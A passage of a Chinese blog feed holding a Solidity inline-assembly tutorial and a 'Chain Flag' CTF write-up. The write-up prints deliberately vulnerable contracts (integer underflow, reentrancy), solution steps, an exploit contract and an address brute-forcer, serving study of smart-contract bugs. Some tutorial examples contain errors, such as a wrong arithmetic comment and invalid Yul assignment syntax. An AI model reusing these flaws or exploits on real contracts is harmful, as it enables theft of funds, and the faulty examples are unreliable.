Contract</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> waves = <span class="keyword">await</span> wavePortalContract.getAllWaves();</span><br></pre></td></tr></table></figure></li><li><p>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-函数重载&quot;&gt;&lt;a href=&quot;#0x01-函数重载&quot; class=&quot;headerlink&quot; title=&quot;0x01 函数重载&quot;&gt;&lt;/a&gt;0x01 函数重载&lt;/h3&gt;&lt;p&gt;函数名相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，&lt;cod</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>solidity编写内联汇编</title>
    <link href="https://banana69.site/2022/08/23/solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>https://banana69.site/2022/08/23/solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</id>
    <published>2022-08-23T08:51:44.000Z</published>
    <updated>2022-08-24T08:36:32.881Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>汇编（也称为<em>汇编语言</em>）是指可使用汇编器转换为机器代码的低级编程语言。 汇编语言与物理机或虚拟机绑定，因为它们实现了指令集。 一条指令告诉CPU执行一些基本任务。</p><p>EVM是一个基于栈的虚拟机（stack machine），栈这种数据结构只允许两个操作：压入（PUSH）或弹出（POP）数据。 最后压入的数据位于栈顶，因此将被第一个弹出，这被称为后进先出 （LIFO：Last In, First Out）。栈虚拟机将所有的操作数保存在栈上，其中所有操作数都存储在栈中。 它仍然具有PC（程序计数器）和SP（堆栈指针）的存储器和寄存器，但是所有内容都存储在栈中。</p><p>至于为什么要在solidity中使用内联汇编，有以下几个优点：</p><ul><li><p><strong>细粒度控制</strong></p><p>可以使用操作码直接与EVM进行交互，这使对智能合约要执行的操作可以进行更精细的控制。</p><p>汇编代码还提供了更多仅靠Solidity不能实现的逻辑权限，例如指向特定的内存插槽，当编写合约库文件时，细粒度控制有很大的作用。</p></li><li><p><strong>减少Gas消耗</strong></p><p>在solidity中使用汇编代码还可以节省Gas，如以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addAssembly(uint x, uint y) public pure returns (uint) &#123;</span><br><span class="line">     assembly &#123;</span><br><span class="line">         let result := add(x, y)</span><br><span class="line">         mstore(0x0, result)</span><br><span class="line">         return(0x0, 32)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function addSolidity(uint x, uint y) public pure returns (uint) &#123;</span><br><span class="line">     return x + y;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>汇编消耗的Gas：</p><p><img src="solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96.assets/image-20220823170713555.png" alt="image-20220823170713555"></p><p>solidity消耗的Gas：</p><p><img src="solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96.assets/image-20220823170734917.png" alt="image-20220823170734917"></p><p>可以看到在简单的加操作中汇编代码要比solidity节省Gas，在更为复杂的合约中节约的Gas也会更多。</p></li><li><p>从 string 中读取数据</p><p>使用内联汇编可以在单个操作中从数据<code>string</code>和<code>bytes</code>类型中读取整个字节（256 位）。Solidity-stringutils 通过对被比较的两个字符串的 32 字节块进行减法来使用它进行非常快速的字符串比较。如果没有汇编，必须逐字节执行此操作。</p></li><li><p>一些操作没有在 Solidity 中公开。例如，sha3 操作码采用内存中的一个字节范围进行哈希计算，而同名的 Solidity 函数采用一个字符串。因此，散列字符串的一部分将需要昂贵的字符串复制操作。使用内联汇编，就可以传入一个字符串并仅对需要的位进行哈希处理。</p></li><li><p>Solidity 不支持从返回可变长度类型（如动态数组、字节或字符串）的声明为external 的函数获取返回值，但如果知道预期的长度，则可以使用内联汇编调用它们。</p></li></ul><h3 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 基本语法</h3><p>solidity的汇编语言更接近 EVM，其定义了俩中汇编语言的实现方式：</p><ul><li>**内联汇编（Inline Assembly )**：可以在内部Solidity源代码中使用。：</li><li><strong>独立汇编（Standalone Assembly</strong>：可以直接使用，无需Solidity。（尚未实现）</li></ul><p>在solidity中使用<code>assembly&#123;&#125;</code>来嵌入汇编代码段，这种形式的汇编被称为内联汇编，在<code>assembly</code>块内的代码开发语言被称为Yul。</p><p>需要注意的是，汇编代码块之间是不能进行通信的，即一个汇编代码块里定义的变量在另一个汇编代码块中不能被访问。（不同的内联汇编块不共享任何名称空间，即不可能调用Yul函数或访问在其他内联汇编块中定义的Yul变量）如以下代码就会报错：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line">    let x := 2</span><br><span class="line">&#125;    </span><br><span class="line">assembly &#123;</span><br><span class="line">    let y := x          // Error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例：计算两数之和</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Add(uint x,uint y) public pure returns(uint) &#123;</span><br><span class="line">assembly&#123;</span><br><span class="line">    let result := add(x,y) //创建一个新的变量result 使用add操作码计算x+y,将结果赋值给result</span><br><span class="line">    mstore(0x0,result)  //从内存中保存结果</span><br><span class="line">    return(0x0,32)         //从内存地址0x0返回32字节</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  在Yul中使用<code>let</code>关键字定义变量，使用 <code>:=</code>操作符赋值给变量，如果没有使用<code>:=</code>那么会将变量的值自动初始化为0。</p><h5 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h5><p>在Solidity汇编中字面量的写法与Solidity一致。不过，字符串字面量最多可以包含32个字符。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line"> let a := 0x123             // 16进制</span><br><span class="line"> let b := 42                // 10进制</span><br><span class="line"> let c := &quot;hello world&quot;     // 字符串</span><br><span class="line"></span><br><span class="line"> let d := &quot;very long string more than 32 bytes&quot; // 超长字符串，出错！</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// TypeError: String literal too long (35 &lt; 32)</span><br><span class="line">// let d := &quot;really long string more than 32 bytes&quot;</span><br><span class="line">// </span><br></pre></td></tr></table></figure><h5 id="块和作用域"><a href="#块和作用域" class="headerlink" title="块和作用域"></a>块和作用域</h5><p>在Solidity汇编中，变量的作用范围遵循标准规则。一个块的范围使用由一对大括号标识。变量仅在定义所在块的范围内有效，当块执行完时，块中的变量也会被销毁。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123; </span><br><span class="line"> let x := 3          // x在各处可见</span><br><span class="line"> // Scope 1 </span><br><span class="line"> &#123; </span><br><span class="line"> let y := x     // ok </span><br><span class="line"> &#125;  // 到此处会销毁y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="变量访问"><a href="#变量访问" class="headerlink" title="变量访问"></a>变量访问</h5><p>在Solidity汇编中，只需要<strong>使用变量名</strong>就可以访问局部变量， 无论该变量是定义在汇编块中，还是汇编块之外（Solidity代码中），不过变量必须是函数的局部变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function assembly_local_var_access() public pure &#123; </span><br><span class="line"> uint b = 5; </span><br><span class="line"> </span><br><span class="line"> assembly &#123;                // defined inside  an assembly block</span><br><span class="line">     let x := add(2, 3) </span><br><span class="line">     let y := 10 </span><br><span class="line">     z := add(x, y)</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> assembly &#123;               // defined outside an assembly block</span><br><span class="line">     let x := add(2, 3)</span><br><span class="line">     let y := mul(x, b)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="For-循环"><a href="#For-循环" class="headerlink" title="For 循环"></a>For 循环</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solitidy中的for循环</span><br><span class="line">function for_loop_solidity(uint n, uint value) public pure returns(uint) &#123;       </span><br><span class="line">    for ( uint i = 0; i &lt; n; i++ ) &#123;</span><br><span class="line">        value = 2 * value;</span><br><span class="line">    &#125;</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//汇编代码</span><br><span class="line">function for_loop_assembly(uint n, uint value) public pure returns (uint) &#123;</span><br><span class="line">     assembly &#123;</span><br><span class="line">     //初始化 let i:=0,执行条件lt(i,n),必须是函数风格表达式，迭代后续步骤add(i,1)</span><br><span class="line">       for &#123; let i := 0 &#125; lt(i, n) &#123; i := add(i, 1) &#125; &#123; </span><br><span class="line">           value := mul(2, value) </span><br><span class="line">       &#125;   </span><br><span class="line">       mstore(0x0, value)</span><br><span class="line">       return(0x0, 32)   </span><br><span class="line">   &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    let x := 34   </span><br><span class="line">    switch lt(x, 30)</span><br><span class="line">    case true &#123;</span><br><span class="line">        // do something</span><br><span class="line">    &#125;</span><br><span class="line">    case false &#123;</span><br><span class="line">        // do something els</span><br><span class="line">    &#125;</span><br><span class="line">    default &#123;</span><br><span class="line">        // 不允许</span><br><span class="line">    &#125;           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>分支列表不需要大括号，但是分支的代码块需要大括号；</li><li>所有的分支条件值必须：1）具有相同的类型 2）具有不同的值；</li><li>如果分支条件已经涵盖所有可能的值，那么不允许再出现default条件。</li></ul><h5 id="汇编函数"><a href="#汇编函数" class="headerlink" title="汇编函数"></a>汇编函数</h5><p>在 Solidity内联汇编中定义底层函数，他们可以包含自己的逻辑，调用这些自定义的函数和使用内置的操作码一样。</p><p>下面的汇编函数用来分配指定长度<code>length</code>的内存，并返回内存指针<code>pos</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    function allocate(length) -&gt; pos &#123;</span><br><span class="line">        pos := mload(0x40)</span><br><span class="line">        mstore(0x40, add(pos, length))</span><br><span class="line">    &#125;</span><br><span class="line">    let free_memory_pointer := allocate(64)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编函数运行如下：</p><ol><li>从栈顶提取参数</li><li>将结果压入栈</li></ol><p>和Solidity函数不同，不需要指定汇编函数的可见性，例如<code>public</code>或<code>private</code>， 因为汇编函数仅在定义所在的汇编代码块内有效。</p><p>汇编变量遵循相同作用域规则。最新的 Solidity 文档对此给出了明确的解释：<strong>Yul 允许定义函数。它们不应与 Solidity 中的函数混淆，因为它们从来不是合约外部接口的一部分，并且独立于 Solidity 函数的命名空间。</strong></p><p>返回值用<code>-&gt;</code> 指定会返回一个值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">    function my_assembly_function(param1, param2) -&gt; my_result &#123;</span><br><span class="line">        // param2 - (4 * param1)</span><br><span class="line">        my_result := sub(param2, mul(4, param1))</span><br><span class="line">    &#125;</span><br><span class="line">    let some_value = my_assembly_function(4, 9)  // 4 - (9 * 4) = 32</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不需要显式返回语句。为了返回一个值，只需在最终语句中将其分配给返回变量</p><blockquote><p>EVM 包含了 <code>return</code> 的内置操作代码。如果在汇编函数中编写了<code>return</code> 操作码，它将停止完全执行当前上下文（内部消息调用），而不仅仅是当前汇编函数。</p></blockquote><p>使用<code>leave</code> 关键字可以放置在汇编函数体的任意位置，以停止其执行流并退出它。它的工作原理与空返回语句完全相同，有一个例外：函数将返回上次复制的变量给返回变量，<font color=red><code>leave</code> 关键字只能在函数内使用</font>。</p><h3 id="0x03-高级汇编"><a href="#0x03-高级汇编" class="headerlink" title="0x03 高级汇编"></a>0x03 高级汇编</h3><p>EVM 操作码可以分为以下几类：</p><ul><li>算数和比较操作</li><li>位操作</li><li>密码学计算，目前仅包含<code>keccak256</code></li><li>环境操作码，主要指与区块链相关的全局信息，例如：<code>blockhash</code>或<code>coinbase</code></li><li>存储、内存和栈操作</li><li>交易与合约调用操作</li><li>停机操作</li><li>日志操作</li></ul><h5 id="多个赋值"><a href="#多个赋值" class="headerlink" title="多个赋值"></a>多个赋值</h5><p>如果调用一个函数反复多个值，可以将他们赋值给元组(tuple)。前面我们已经可以在汇编中创建函数，这些函数可以返回多个值。使用汇编函数可以一次分配多个值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assembly &#123;</span><br><span class="line">      function f() -&gt; a, b &#123;&#125;</span><br><span class="line">      let c, d := f()           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="栈平衡（Stack-balancing）"><a href="#栈平衡（Stack-balancing）" class="headerlink" title="栈平衡（Stack balancing）"></a>栈平衡（Stack balancing）</h5><p>在每个 <code>assembly &#123; ... &#125;</code> 块的末尾，必须平衡堆栈（除非另有要求）。 否则，编译器将生成警告。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-介绍&quot;&gt;&lt;a href=&quot;#0x01-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍&quot;&gt;&lt;/a&gt;0x01 介绍&lt;/h3&gt;&lt;p&gt;汇编（也称为&lt;em&gt;汇编语言&lt;/em&gt;）是指可使用汇编器转换为机器代码的低级编程语言。 汇编语言与物</summary>
      
    
    
    
    
    <category term="solidity 智能合约" scheme="https://banana69.site/tags/solidity-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Chain Flag记录</title>
    <link href="https://banana69.site/2022/08/19/Chain-Flag%E8%AE%B0%E5%BD%95/"/>
    <id>https://banana69.site/2022/08/19/Chain-Flag%E8%AE%B0%E5%BD%95/</id>
    <published>2022-08-19T09:38:23.000Z</published>
    <updated>2022-09-16T15:46:07.724Z</updated>
    
    <content type="html"><![CDATA[<h3 id="integer-overflow"><a href="#integer-overflow" class="headerlink" title="integer overflow"></a>integer overflow</h3><h4 id="bet"><a href="#bet" class="headerlink" title="bet"></a>bet</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract bet &#123;</span><br><span class="line">    uint secret;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    mapping(address =&gt; uint) public isbet;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    function Bet() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier only_owner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function setsecret(uint secretrcv) only_owner &#123;</span><br><span class="line">        secret=secretrcv;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() &#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function betgame(uint secretguess)&#123;</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-=1;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">            isbet[msg.sender]=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function doublebetgame(uint secretguess) only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]==1);</span><br><span class="line">        balanceOf[msg.sender]-=2;</span><br><span class="line">        if (secretguess==secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析题目，当账户中的余额大于<code>100000</code>时可以得到 flag，而增加账户余额的方法有俩个，<code>betgame</code>和<code>dou blebetgame</code>函数，在执行<code>betgame</code>时要求账户中的余额大于 0且需要猜中secrt，而在<code>doublebetgame</code>中的<code>balanceOf[msg.sender]-2&gt;0</code>会造成溢出。</p><p>整个的解题流程为：</p><ol><li>先调用<code>Bet()</code>函数，成为owner;</li><li>调用<code>profit</code>或<code>deposit</code>往合约中存入 1 ether，使可以通过betgame函数中的 require；</li><li>调用 <code>serSecret</code> 函数，设置 secert；</li><li>调用<code>betgame</code>函数俩次，第一次要通过 if，使<code>isBet = 1</code>，可以通过<code>doublebetgame</code>函数的第二个require，第二次调用时不能if判断，使<code>balanceOf[msg.sender]=1</code>，可以通过<code>doublebetgame</code>函数的第一个require;</li><li>调用<code>doublebetgame</code>函数，在<code>balanceOf[msg.sender]-=2;</code>处溢出；</li><li>最后调用<code>payforflag</code>函数获取flag。</li></ol><p>攻击合约为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    address constant private addr = 0x30d0a604d8c90064a0a3ca4beeea177eff3e9bcd;</span><br><span class="line">    bet public hack;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        hack = bet(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function becomeOwner() public &#123;</span><br><span class="line">        hack.Bet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function  setSecret(uint num) public &#123;</span><br><span class="line">        hack.setsecret(num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function profit() payable public &#123;</span><br><span class="line">        hack.profit();</span><br><span class="line">    &#125;</span><br><span class="line">    /*</span><br><span class="line">    或者使用 deposit() 函数存入 1 ether</span><br><span class="line">    function deposit() payable public &#123;</span><br><span class="line">        hack.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function firstBet(uint secret) public &#123;</span><br><span class="line">        hack.betgame(secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function secondBet(uint secret) public &#123;</span><br><span class="line">        hack.doublebetgame(secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint)&#123;</span><br><span class="line">        return hack.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getIsbet() public view returns (uint)&#123;</span><br><span class="line">        return hack.isbet(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getFlag(string email) public &#123;</span><br><span class="line">        hack.payforflag(email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //fallback 函数</span><br><span class="line">    function() public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hf"><a href="#hf" class="headerlink" title="hf"></a>hf</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract hf &#123;</span><br><span class="line">    address secret;</span><br><span class="line">    uint count;</span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; uint) public balanceOf;</span><br><span class="line">    mapping(address =&gt; uint) public gift;</span><br><span class="line">    </span><br><span class="line">    struct node &#123;</span><br><span class="line">        address nodeadress;</span><br><span class="line">        uint nodenumber;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    node public node0;</span><br><span class="line">    </span><br><span class="line">    event SendFlag(string b64email);</span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function payforflag(string b64email) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= 100000);</span><br><span class="line">        balanceOf[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit SendFlag(b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //to fuck</span><br><span class="line">    </span><br><span class="line">    modifier onlySecret() &#123;</span><br><span class="line">        require(msg.sender == secret);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(gift[msg.sender]==0);</span><br><span class="line">        gift[msg.sender]=1;</span><br><span class="line">        balanceOf[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function hfvote() public payable&#123;</span><br><span class="line">        uint geteth=msg.value/1000000000000000000;</span><br><span class="line">        balanceOf[msg.sender]+=geteth;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function ubw() public payable&#123;</span><br><span class="line">        if (msg.value &lt; 2 ether)</span><br><span class="line">        &#123;</span><br><span class="line">            node storage n = node0;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            n.nodeadress=msg.sender;</span><br><span class="line">            n.nodenumber=2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function fate(address to,uint value) public onlySecret &#123;</span><br><span class="line">        require(balanceOf[msg.sender]-value&gt;=0);</span><br><span class="line">        balanceOf[msg.sender]-=value;</span><br><span class="line">        balanceOf[to]+=value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与上一题类似在<code>fate()</code>函数处存在溢出，但是要求满足<code>require(balanceOf[msg.sender]-value&gt;=0);</code>在<code>ubw()</code>函数中，<strong>else</strong> 缺少条件，所以可以执行<code>else</code>中的代码使得<code>n.nodeadress=msg.sender;</code>，然后执行<code>balanceOf[msg.sender]-=value;</code>造成溢出。</p><p>解题步骤为：</p><ol><li>执行<code> ubw()</code>函数且<strong>msg.value &gt; 2 ether</strong>，使<code>n.nodeadress=msg.sender;</code></li><li>执行<code>fate()</code>函数，**msg.value &gt; 0 **；</li></ol><h3 id="reentrancy"><a href="#reentrancy" class="headerlink" title="reentrancy"></a>reentrancy</h3><h4 id="babybank"><a href="#babybank" class="headerlink" title="babybank"></a>babybank</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract babybank &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balance;</span><br><span class="line">    mapping(address =&gt; uint) public level;</span><br><span class="line">    address owner;</span><br><span class="line">    uint secret;</span><br><span class="line">    </span><br><span class="line">    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span><br><span class="line">    //Gmail is ok. 163 and qq may have some problems.</span><br><span class="line">    event sendflag(string md5ofteamtoken,string b64email); </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //pay for flag</span><br><span class="line">    function payforflag(string md5ofteamtoken,string b64email) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">        emit sendflag(md5ofteamtoken,b64email);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner()&#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 1 </span><br><span class="line">    function profit() public&#123;</span><br><span class="line">        require(level[msg.sender]==0);</span><br><span class="line">        require(uint(msg.sender) &amp; 0xffff==0xb1b1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 2</span><br><span class="line">    function set_secret(uint new_secret) public onlyOwner&#123;</span><br><span class="line">        secret=new_secret;</span><br><span class="line">    &#125;</span><br><span class="line">    function guess(uint guess_secret) public&#123;</span><br><span class="line">        require(guess_secret==secret);</span><br><span class="line">        require(level[msg.sender]==1);</span><br><span class="line">        balance[msg.sender]+=1;</span><br><span class="line">        level[msg.sender]+=1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //challenge 3</span><br><span class="line">    function transfer(address to, uint amount) public&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(level[msg.sender]==2);</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">        balance[to] = amount;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount*100000000000000)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>challenge1 中可以使账户余额加 1，但是需要满足条件，即外部账号以<code>0xb1b1</code>结尾，可以对账户进行爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ethereum <span class="keyword">import</span> utils</span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa1</span>():</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> addr.lower().endswith(<span class="string">&quot;b1b1&quot;</span>):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(addr, priv.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate EOA with the ability to deploy contract with appendix 1b1b</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_eoa2</span>():</span></span><br><span class="line">    priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">    addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> utils.decode_addr(utils.mk_contract_address(addr, <span class="number">0</span>)).endswith(<span class="string">&quot;1b1b&quot;</span>):</span><br><span class="line">        priv = utils.sha3(os.urandom(<span class="number">4096</span>))</span><br><span class="line">        addr = utils.checksum_encode(utils.privtoaddr(priv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Address: &#123;&#125;\nPrivate Key: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(addr, priv.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        generate_eoa1()</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        generate_eoa2()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter valid 